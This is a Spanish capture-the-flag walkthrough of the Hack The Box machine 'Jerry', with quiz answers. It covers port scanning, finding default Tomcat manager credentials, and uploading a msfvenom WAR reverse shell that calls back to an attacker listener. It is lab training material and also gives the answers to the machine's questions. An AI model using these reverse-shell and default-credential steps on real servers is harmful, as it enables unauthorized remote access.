1)¿Qué puerto TCP está abierto en el host remoto?
	8080

2)¿Qué servidor web se está ejecutando en el host remoto? Buscando dos palabras.
	apache tomcat

3)¿Qué ruta relativa en el servidor web lleva al Web Application Manager?
	/manager/html

4)¿Cuál es la combinación válida de nombre de usuario y contraseña para autenticarse en el gestor de aplicaciones web Tomcat? Dar la respuesta en el formato de nombre de usuario:contraseña
	tomcat:s3cret

5)¿Qué tipo de archivo puede cargarse y desplegarse en el servidor utilizando el Administrador de Aplicaciones Web Tomcat?
	war


-----
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.10.10.95
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.10.95 -oG allPorts
nmap -sCV -p8080 10.10.10.95 -oN target
```

![[Jerry1.png]]
![[Jerry2.png]]
*TTL:* Maquina windows
*Puertos:*
	``8080 `` HTTP 

--------
# [[Enumeracion con pequeño script de NMAP y Whatweb-wappalyzer]]

```shell
whatweb http://10.10.10.95:8080/
```
![[Jerry3.png]]

![[Jerry7.png]]
Nos indica que esta el directorio /manager/html

---------
# [[Arbitrary file upload]] en tomcat

Entramos a la pagina principal y vemos que es un tomcat
![[Jerry5.png]]
Ponemos un usuario y contraseña para probar
![[Jerry6.png]]
Y en la pagina de error, nos muestra un usuario y contraseña que al probarlos, vemos que podemos ingresar al panel de tomcat
![[Jerry4.png]]

![[Jerry11.png]]
Vemos que podemos subir archivos .war. Asi que vamos a mandarnos una [[Reverse shell]]

-------
# [[Reverse shell]]

Con [[msfvenom]] creamos el archivo .war

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.11 LPORT=443 -f war -o shell.war
```

![[Jerry8.png]]
Creamos el archivo shell.war que lo vamos a subir a la pagina 

Ahora mientras estamos en escucha con [[rlwrap nc -lvnp 443]] vamos a ingresar a la pagina http://10.10.10.95:8080/shell/ para ejecutar el archivo shell.war que subimos anteriormente
Y listo ya estamos adentro de la maquina y podemos catear las flags
![[Jerry9.png]]

![[Jerry10.png]]

---------
# Notas

Tomcat es un servidor de aplicaciones desarrollado por Apache que permite ejecutar aplicaciones web escritas en Java. Funciona como contenedor de servlets y JSP, siguiendo la especificación Java EE. Escucha comúnmente en el puerto 8080. Es usado tanto en entornos de desarrollo como en producción.

----
# Creditos

[Writeup de territoriohacker](https://territoriohacker.com/htb-jerry/)